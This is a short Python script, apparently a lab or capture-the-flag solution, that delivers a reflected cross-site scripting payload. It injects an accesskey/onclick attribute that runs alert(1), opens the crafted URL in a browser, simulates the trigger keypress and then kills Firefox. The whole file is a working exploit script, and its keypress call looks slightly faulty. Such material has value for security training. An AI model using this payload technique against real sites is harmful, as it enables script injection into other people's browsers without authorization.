import pyautogui
import sys
import requests
import webbrowser
import time
import os

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1] + '/?%27accesskey=%27x%27onclick=%27alert(1)'
requests.get(burp_url)
webbrowser.open(burp_url)
time.sleep(5)
pyautogui.press('alt','x')
time.sleep(2)
os.system("pkill firefox")
